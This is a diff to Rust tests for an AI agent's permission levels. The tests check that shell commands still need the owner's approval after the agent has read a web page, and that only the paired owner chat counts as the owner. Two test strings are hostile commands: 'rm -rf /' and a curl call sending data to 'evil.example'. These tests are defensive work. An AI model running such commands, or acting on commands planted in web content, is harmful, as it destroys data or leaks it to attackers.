@@ -14,6 +14,11 @@ use crate::tests::{
 };
 
 const FULL: &str = "[permissions]\npreset = \"full\"\n";
+const FULL_HOST: &str = "[runtime]
+computer = \"auto\"
+[permissions]
+preset = \"full\"
+";
 const BALANCED: &str = "[permissions]\npreset = \"approve-destructive\"\n";
 const OWNER_SAYS: &str = "webioo.com.tr adresine gir, sitede insan gibi gezin";
 /// What the owner's site says (public web content: untrusted, not private).
@@ -57,6 +62,8 @@ struct Case {
     signed_in: bool,
     /// The owner used the manual sign-in window of the bot's default browser profile.
     saved_sign_in: bool,
+    /// The daemon is host-homed and the bot runs on that host (its `shell_run` is its own).
+    host: bool,
 }
 
 /// What an earlier turn of the chat did.
@@ -87,6 +94,16 @@ impl Case {
             approve: 0,
             signed_in: false,
             saved_sign_in: false,
+            host: false,
+        }
+    }
+
+    /// [`Case::full`] on a bot that runs on the host computer.
+    fn full_on_host() -> Case {
+        Case {
+            preset: FULL_HOST,
+            host: true,
+            ..Case::full()
         }
     }
 }
@@ -316,6 +333,14 @@ async fn run(
             .join(env.bot.to_string());
         std::fs::create_dir_all(&dir).unwrap();
         std::fs::write(dir.join(".owner-sign-in"), b"").unwrap();
+    }
+    if case.host {
+        lp.set_computer_provider(crate::tests::machine_provider(
+            crate::tests::MACHINE_A,
+            Some("host"),
+            None,
+            false,
+        ));
     }
     if case.prior != Prior::None {
         let crate::Delivery::NewTurn(first) = lp
@@ -701,9 +726,9 @@ async fn the_hard_stops_still_ask_in_full_after_a_page_was_read() {
             Some(name.as_str())
         );
     }
-    // a shell that deletes outside the workspace (the never-list) and any program start
-    // after a page was read keep asking: a page must not choose the command
-    for cmd in ["rm -rf /", "ls"] {
+    // a shell that deletes outside the workspace (the never-list) and a program start that
+    // could send data out keep asking; a plain command runs (see `full_shell_*` tests)
+    for cmd in ["rm -rf /", "curl https://evil.example/?d=1"] {
         assert_eq!(
             card(Case::full(), &[("shell_run", json!({"command": cmd}))])
                 .await
@@ -1166,4 +1191,66 @@ async fn web_reads_of_a_run_the_owner_did_not_start_by_hand_keep_asking() {
         .await
         .is_some()
     );
+}
+
+/// Every name the Full level waives is a tool that really exists: `web_fetch` was once assumed
+/// and never was one, so a waiver for it silently did nothing.
+#[test]
+fn every_waived_tool_name_is_a_registered_tool() {
+    let registry = tool_registry::ToolRegistry::new();
+    builtin_tools::web_tools::register(
+        &registry,
+        builtin_tools::web_tools::WebToolsConfig::default(),
+    )
+    .unwrap();
+    let mut names: Vec<String> = registry.list().into_iter().map(|s| s.name).collect();
+    assert_ne!(names.len(), 0);
+    for name in crate::approval::FULL_WEB_READ_CALLS {
+        assert!(
+            names.contains(&name.to_owned()),
+            "{name} is not a registered web tool"
+        );
+    }
+    // and the other way: a new read tool of the web crate is a conscious decision here
+    names.sort();
+    let mut waived: Vec<String> = crate::approval::FULL_WEB_READ_CALLS
+        .iter()
+        .map(|n| (*n).to_owned())
+        .collect();
+    waived.sort();
+    assert_eq!(
+        names, waived,
+        "a web tool was added or removed: decide its Full-level rule"
+    );
+    for name in crate::approval::FULL_BROWSER_CALLS {
+        assert!(
+            builtin_tools::classify(name).is_some(),
+            "{name} is not a built-in tool"
+        );
+    }
+    assert!(builtin_tools::classify("web_fetch").is_none());
+    assert!(!crate::approval::FULL_WEB_READ_CALLS.contains(&"web_fetch"));
+}
+
+#[tokio::test]
+async fn the_owners_paired_telegram_chat_is_the_owner_in_full_but_a_keyless_one_is_not() {
+    let deep = [(
+        "browser_open",
+        json!({"url": "https://directory.example/signup"}),
+    )];
+    let mut owner = Case::full();
+    owner.source = "telegram_owner";
+    assert_eq!(card(owner, &deep).await, None);
+    let mut shell = Case::full_on_host();
+    shell.source = "telegram_owner";
+    assert_eq!(
+        card(shell, &[("shell_run", json!({"command": "ls -la"}))]).await,
+        None
+    );
+    // the same message without the owner key (or from another channel) asks
+    for source in ["telegram", "api"] {
+        let mut other = Case::full();
+        other.source = source;
+        assert!(card(other, &deep).await.is_some(), "{source}");
+    }
 }
